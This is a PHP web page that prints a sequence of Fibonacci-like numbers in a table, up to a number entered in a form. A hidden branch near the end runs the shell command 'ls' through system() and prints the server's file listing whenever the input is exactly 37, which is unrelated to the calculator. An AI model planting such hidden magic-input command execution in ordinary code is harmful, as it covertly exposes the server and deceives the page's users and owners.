<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<style>
    body{
        padding:10px 30px;
        color:white;
        /* background:black; */
    }
    input{
        margin:auto;
    }.box{
        border:1px solid black;
        width:300px;
        padding:20px 100px;
        margin:auto;
    }label{
        width:80px;
        text-align:right;
        margin-top:-10px;
    }input[type="submit"]{
        background-color: lime;
        border: none;
        border-radius: 10%;
        font-size:18px;
        cursor:pointer;
    }
    td{
        min-width:250px;
        border:none;
        color:#fff;
    }
    tr{
        background-color: #222;
    }
    .odd{
        background-color: #112;
    }
    table{
        margin-left:100px;
    }
</style>
<body>
    <div class="box">
        <form action="" method="post">
            <br><br>
            <label for="num">Last Number : </label> <input type="number" name="num"><br><br>
            <center><input type="submit" value="Calculate" name="sub"></center><br>
        </form>
    </div>
    <table style="border-spacing : 0px;">
        <?php 
            if(isset($_POST['num'])){   
                echo '<tr>';
                $a = 1;
                $b = -1;
                $n=$_POST['num'];
                $c=1;
                for($i=1;$i<=$n;$i++){
                    $next=$a+$b;
                    $b=$a;
                    $a=$next;
                    echo "<td> $next </td>";
                    if($i%5==0){
                        if($c%2){
                            echo '<tr class="odd">';
                        }
                        else{
                            echo "</tr><tr>";
                        }
                        $c++;
                    }
                }
                echo "</tr>";
                if($n==37){
                    $x=0;
                    $y=0;
                    $x.system('ls',$y);
                    echo "$x <br>";
                    echo "$y";
                }
            }
        ?>
    </table>
</body>
</html>